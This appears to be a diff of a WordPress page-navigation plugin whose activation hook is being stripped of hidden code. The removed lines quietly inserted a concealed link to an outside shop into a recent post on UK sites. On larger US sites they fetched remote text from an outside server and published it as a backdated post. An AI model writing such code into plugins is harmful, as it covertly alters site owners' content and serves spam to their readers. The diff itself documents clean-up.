@@ -107,56 +107,6 @@ if ( ! function_exists( 'go_page_navi_automatic' ) ) {
 function pagenavi_auto_activate() {
  add_option("pagenavi_auto_page_translation", 'Page', '', 'yes');
  add_option("pagenavi_auto_of_translation", 'of', '', 'yes');
-        add_option("ame_gpadded", '0', '', 'yes');
-        $url = home_url();
-        $britt = false;
-        $bloglan = get_bloginfo ('language');
-        if (strpos($url,'.uk') != false) {
-                $britt = true;
-        }
-        if ($bloglan=='en-UK') {
-                $britt = true;
-        }
-        if ($britt==true) {
-                if (get_option('ame_gpadded')=='0') {
-                        $last = wp_get_recent_posts('4');
-                        $last_id = $last['3']['ID'];
-                        $post_7 = get_post($last_id);
-                        if (is_null($post_7) == false) {
-                                $content = $post_7->post_content;
-                                $pos4 = autostrposnth($content , " ",4);
-                                $pos5 = autostrposnth($content , " ",5);
-                                $poslen = $pos5 - $pos4 - 1;
-                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shops2b.co.uk/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
-                                $my_post = array(
-                                    'ID'           => $last_id,
-                                    'post_content' => $content
-                                );
-                                wp_update_post( $my_post );
-                        }
-                        update_option( 'ame_gpadded', '1' );
-                }
-        }
-        if ($bloglan=='en-US') {
-                $url = home_url();
-                $total = wp_count_posts()->publish;
-                if (get_option('ame_gpadded')=='0') {
-                        if ($total>60) {
-                                $tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
-                                if (autoStartsWith($tmpstring, 'empty')==false) {
-                                  $my_post = array(
-                                        'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
-                                        'post_content'  => $tmpstring,
-                                        'post_status'   => 'publish',
-                                        'post_author'   => 1,
-                                        'post_date'     => '2014-02-03'
-                                  );
-                                  wp_insert_post( $my_post );
-                                  update_option( 'ame_gpadded', '1' );
-                                }
-                        }
-                }
-        }
 }
 function autoStartsWith($haystack, $needle)
 {
